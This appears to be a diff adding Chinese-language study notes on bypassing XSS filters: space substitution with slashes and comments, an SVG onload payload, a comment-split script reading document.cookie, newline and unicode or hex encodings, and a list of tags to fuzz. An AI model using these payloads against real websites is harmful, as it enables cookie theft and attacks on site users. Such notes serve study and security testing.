@@ -352,3 +352,38 @@ xss分为反射型、存储型、dom型。
  < &lt;  
  > &gt;
 
+过滤空格绕过  
+/  
+/**/  
+*/alert/*  
+/=><svg/onload=alert(1)>  
+<script>/*  
+*/(document/*  
+*/.cookie)/*  
+*/</script>  
+换行绕过  
+  %0d  
+  %0a  
+  %09  
+
+过滤<>  
+看位置有的位置不需要<>比如,<a hrfe="">1</a>,<input type="text" value="">  
+使用unicode编码  
+< \u003c > \u003e  
+<还可以为\x3c >为\x3e  
+使用url编码html编码进行绕过  
+
+各种编码浏览器解码顺序为HTML解码 -> URL解码 -> js(unicode)解码HTML、js、进制编码  
+
+过滤标签属性函数  
+fuzz其他可用的标签属性函数  
+<a  
+<img  
+<svg  
+<iframe  
+<input  
+<body  
+<META  
+<form  
+也可以自己构造html标签  
+
